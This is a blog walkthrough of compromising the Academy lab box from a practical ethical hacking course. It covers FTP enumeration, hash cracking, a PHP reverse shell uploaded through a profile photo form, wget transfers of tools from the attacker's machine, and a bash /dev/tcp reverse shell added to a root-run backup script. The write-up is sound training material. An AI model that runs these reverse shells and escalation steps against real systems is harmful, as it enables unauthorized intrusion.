---
title: "Rooting the Academy Box: A Practical Ethical Hacking Walkthrough"
layout: single
author_profile: true
date: 2024-03-19
toc: true
toc_label: "Table of Contents"
toc_sticky: true
categories:
  - Blog
tags:
  - Penetration Testing
  - Enumeration
  - Linux Privilege Escalation
  - Web App Security
tagline: "From Zero to Root: A Step-by-Step Guide to Compromising the Academy Box"
header:
  image: /assets/images/tcm-academy/academy-header-image.png
  caption: "Navigating the Digital Labyrinth: A Journey Through Ethical Hacking"
  teaser: /assets/images/tcm-academy/academy-teaser.png
  overlay_image: /assets/images/tcm-academy/academy-overlay-pattern.png
  overlay_filter: rgba(0, 0, 0, 0.5)
---

# Rooting the Academy Box: A Practical Ethical Hacking Walkthrough

In this blog post, I'll walk you through the process of rooting the Academy box from the TCM Academy's Practical Ethical Hacker course. The box was designed to test your skills in directory busting, FTP exploration, PHP webshell uploads, and Linux privilege escalation.


### Key Learning Objectives
- Network service enumeration
- Hash cracking techniques
- Web application vulnerability exploitation
- File upload bypass techniques
- Linux privilege escalation through cron job manipulation

## Environment Setup

This box simulates a vulnerable educational institution's network infrastructure, specifically targeting their student registration system. The environment represents a common scenario where seemingly minor misconfigurations can lead to full system compromise.


## Attack Path Overview
1. Initial enumeration reveals FTP, HTTP, and SSH services
2. Anonymous FTP access provides crucial student registration information
3. Web application discovered with student portal login
4. File upload vulnerability in student profile section
5. Privilege escalation through periodic backup script

### Attack Path Diagram

<img src="/assets/images/tcm-academy/academy-network-diagram.png">

## Detailed Walkthrough

### Initial Enumeration

Starting with a thorough nmap scan to identify open ports and services:

```bash
nmap -p- -A -T4 192.168.17.136 -oN map.txt
```

The scan revealed the following open ports and services:

* FTP (21) - vsftp 3.0.3
* HTTP (80) - Apache httpd 2.4.38 (Debian)
* SSH (22) - OpenSSH 7.9p1

<img src="/assets/images/tcm-academy/academy-02.png">

From this, I identified two primary attack vectors to explore: the FTP service running on port 21 and the web server running on port 80.

### FTP Enumeration

I began by connecting to the FTP server on the target machine. To do this, I used the ftp command, followed by the target IP address. I used anonymous login since this option was enabled on the server.

```bash
ftp 192.168.17.136
ls
```

Once connected, I listed the contents of the current directory with the <strong>ls</strong> command. This revealed a file named note.txt in the present directory.

At this point, I downloaded the note.txt file to see if it contained any useful information for further exploitation:


```bash
get note.txt
```

<img src="/assets/images/tcm-academy/academy-03.png">




The note contained information about a student registration database, but more interestingly, it included a password hash. This hash seemed like it could be the key to accessing additional resources or gaining further control over the system.

```bash
cat note.txt
```

<img src="/assets/images/tcm-academy/academy-04.png">


<img src="/assets/images/tcm-academy/academy-05.png">


To identify the hash type, I used the hash-identifier tool on Kali Linux, which identified it as an md5 type hash:

```bash
hash-identifier 
```

<img src="/assets/images/tcm-academy/academy-06.png">

I saved the hash to an acceptable format and used the Hashcat tool to crack it:

```bash
gedit hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt 
```

<img src="/assets/images/tcm-academy/academy-07.png">


<img src="/assets/images/tcm-academy/academy-08.png">

### Web Application Discovery

With the information gathered from the FTP service, I turned my attention to the web server running on port 80. I opened the browser and navigated to the target IP address. The Apache default page appeared, indicating that the server was running Apache and no custom web page had been configured yet.

<img src="/assets/images/tcm-academy/academy-09.png">

Moving to directory enumeration:

I first checked for any information in robots.txt:


```bash
http://192.168.17.136/robots.txt
```

<img src="/assets/images/tcm-academy/academy-09-robots.png">

I also examined the page source:


```bash
right-click > view page source
```

<img src="/assets/images/tcm-academy/academy-09-page source.png">

To continue my investigation, I initially used dirb for directory busting to identify hidden directories or files on the web server.
In addition to using dirb, I also employed the ffuf tool to fuzz a parameter on the server:



```bash
dirb http://192.168.17.136
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.17.136/FUZZ
```

<img src="/assets/images/tcm-academy/academy-10.png">


<img src="/assets/images/tcm-academy/academy-11.png">

The results revealed 301 redirects for two interesting paths: /phpmyadmin and /academy. These redirects suggested that these directories were actively being used on the server and could lead to further vulnerabilities or misconfigurations.
Upon visiting http://192.168.17.136/academy, I found a login form requesting a student registration number and password:

<img src="/assets/images/tcm-academy/academy-12-student.png">



### Gaining Initial Access

Using the previously obtained credentials, I successfully log into the academy student portal login page:


<img src="/assets/images/tcm-academy/academy-12.png">

### Exploiting File Upload

After successfully logging into the target system, I explored the available options within the online course registration page. The "My Profile" page at http://192.168.17.136/academy/my-profile.php contained a photo upload form:

<img src="/assets/images/tcm-academy/academy-13.png">

Testing confirmed uploads were stored at:
```bash
/academy/studentphoto/flower.jpg
```

<img src="/assets/images/tcm-academy/academy-14.png">

I prepared a PHP reverse shell using the <a href="http://https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"> Pentest Monkey payload: 



```bash
nano reverse-shell.php
```

I updated the IP entry of the payload match the IP address configured to my Kali attack machine, 192.168.17.134 and I left the 1234 as the port for which I configured the same as the listening port on my Kali attack machine:


<img src="/assets/images/tcm-academy/academy-15.png">

<img src="/assets/images/tcm-academy/academy-16.png">


Before uploading, I started a netcat listener on my Kali attack machine:


```bash
nc -nvlp 1234
```


<img src="/assets/images/tcm-academy/academy-17.png">

I then uploaded the PHP reverse shell through the photo upload form:

<img src="/assets/images/tcm-academy/academy-18.png">

The shell immediately connected back to my Kali machine and I was logged in to the target using the www-data user account, which did not have any elevated privileges:

<img src="/assets/images/tcm-academy/academy-19.png">

### Privilege Escalation

Using LINPEAS for initial enumeration:

At this point, I had successfully gained access as the www-data user, but I wasn’t logged in as root. Therefore, the next step was to attempt privilege escalation to gain higher-level access to the system.

I decided to use LINPEAS, a popular tool designed to hunt for potential privilege escalation opportunities on Linux systems. LINPEAS automates the process of searching for misconfigurations, weaknesses, and other possible vectors that could allow a low-privileged user to escalate to root.

LINPEAS can be downloaded from its GitHub repository:

<a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md">LINPEAS GitHub Repository</a>

Next, I created a transfer folder on my Kali machine to store the LINPEAS script. I spun up a web server within this directory to serve files that can be downloaded by other machines. 

```bash
mkdir transfers
cd transfers
python3 -m http.server 80
```
<img src="/assets/images/tcm-academy/academy-20.png">

I downloaded LINPEAS into my transfers directory on my Kali machine and then transfered it to the target (via the reverse shell connection) by using a wget command on the target machine (wget http://<attackerIP>/linpeas.sh). I then ran LINPEAS there to search for privilege escalation vectors:


```bash
wget http://192.168.17.134/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

<img src="/assets/images/tcm-academy/academy-21.png">


<img src="/assets/images/tcm-academy/academy-22.png">

LINPEAS revealed several interesting findings:
- A backup script in /home/grimmie that was conifgured as a cron job
- MySQL credentials
- User "grimmie" with elevated privileges

<img src="/assets/images/tcm-academy/academy-23.png">


<img src="/assets/images/tcm-academy/academy-24.png">


<img src="/assets/images/tcm-academy/academy-25.png">


<img src="/assets/images/tcm-academy/academy-26.png">


<img src="/assets/images/tcm-academy/academy-27.png">


Using the discovered credentials, I was able to SSH connect to the target using the grimmie user account:


```bash
ssh grimmie@192.168.17.136
```

<img src="/assets/images/tcm-academy/academy-28.png">

Investigating user context:

Once logged in, I checked for sudo privileges by running the sudo -l command. However, I received an error. I also checked for any leads via the history command.   

Since Grimmie didn’t have access to sudo, I decided to try the history command to see if there were any previously executed commands that might provide additional insights or opportunities for privilege escalation.

```bash
sudo -l
history
```
<img src="/assets/images/tcm-academy/academy-29.png">

Investigating the backup.sh Script

The LINPEAS output had already pointed out the backup.sh script, so I decided to investigate it further. I navigated to the /home/grimmie directory.  In this directory, I found the backup.sh script and examined its contents:


```bash
cd /home/grimmie
ls
cat backup.sh
```

<img src="/assets/images/tcm-academy/academy-30.png">

The backup.sh script does the following as a scheduled task:

- Removes an existing backup.zip file in the /tmp directory.
- Creates a backup.zip file containing the /var/www/html/academy/includes directory.
- Changes the permissions of the backup.zip file to 700, making it accessible only to the file’s owner.

Since this script backs up files from the /var/www/html/academy/includes directory, it could provide valuable information or access if these files contain sensitive data.


Investigating Cron Jobs for Backup Script

It’s possible that the backup.sh script is being run periodically through a cron job, which would automate the backup process. To determine if that’s the case, we can check the cron jobs for both the Grimmie user and the root user, as backup.sh is located in /home/grimmie and could be scheduled to run automatically.

We can check for cron jobs using the following commands:


<img src="/assets/images/tcm-academy/academy-31.png">

```bash
crontab -l
crontab -u root -l 
crontab -e 
systemctl list-timers
```
The output here indicates that there are no cron jobs scheduled for grimmie or the root user. 

Checking System Timers
Since cron jobs may not have been used, I turned to systemd timers to see if there were any automated tasks running on a timer. To do this, I ran the following command:
<img src="/assets/images/tcm-academy/academy-32.png">

This gave me information about any timers set to trigger actions periodically.

I also used the ps command to check for any running processes that could provide further insight into scheduled tasks.  This command showed the running processes on the system, which could include scripts or other services.


<img src="/assets/images/tcm-academy/academy-33.png">

Using pspy to Confirm the Timer 
To confirm whether the backup.sh script was running on a timer, I decided to use the pspy tool. pspy is useful for detecting processes running on a system without requiring root privileges.

<a href="https://github.com/DominicBreuker/pspy">pspy GitHub</a>

I downloaded pspy to my Kali machine, in the same directory where I had previously hosted the web server.  From the reverse shell connection to the target machine, I requested a download of it to the target using the wget command:
Using pspy to monitor for script execution:

```bash
wget http://192.168.17.134/pspy64
chmod +x pspy64
./pspy64
```

<img src="/assets/images/tcm-academy/academy-35.png">


<img src="/assets/images/tcm-academy/academy-36.png">

Pspy is pretty neat!  It gave me output of all the processes that are running on the machine. Looking at the provided output, I found that the backup.sh script was indeed running. This confirmed that the script was scheduled to execute periodically. We were able to observe how often it was running—every minute.

At this point, I realized I could exploit this recurring task for further access.


<img src="/assets/images/tcm-academy/academy-37.png">

### Root Access

Abusing the Periodic Backup Script
Since the backup.sh script was running automatically, I decided to modify it to add a reverse shell payload. This way, when the script executed, it would also execute the reverse shell, giving me access to the system.

Adding Reverse Shell to backup.sh

I navigated back to the /home/grimmie directory.

I then added a reverse shell to the backup.sh script. I grabbed a one-line reverse shell from the Pentest Monkey Reverse Shell cheatsheet:

<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey's Reverse Shell Cheat Sheet</a>

Here’s the command I added to the script:

<img src="/assets/images/tcm-academy/academy-38.png">

I substituted 10.0.0.1 with my attacker IP address and added this to the backup.sh script.


```bash
bash -i >& /dev/tcp/192.168.17.134/8080 0>&1
```

<img src="/assets/images/tcm-academy/academy-39-1.png">


<img src="/assets/images/tcm-academy/academy-39-2.png">


When the backup script executed, it gave me root access:

<img src="/assets/images/tcm-academy/academy-40.png">

### Success - Root Access Achieved

Finally, I captured the flag from the /root directory:

```bash
whoami
cd /root
ls
cat flag.txt
```

<img src="/assets/images/tcm-academy/academy-41.png">


### Conclusion

This walkthrough demonstrated a complete penetration testing workflow, from initial enumeration through privilege escalation to ultimately achieving root access. The Academy box provided excellent practice in:
- Service enumeration
- Password cracking
- Web application security
- File upload vulnerabilities
- Linux privilege escalation techniques (Cron job)

Remember that the techniques demonstrated here should only be used in authorized testing environments. Always ensure you have proper permission before attempting any security testing.



Thank you for reading!

- NotesByNisha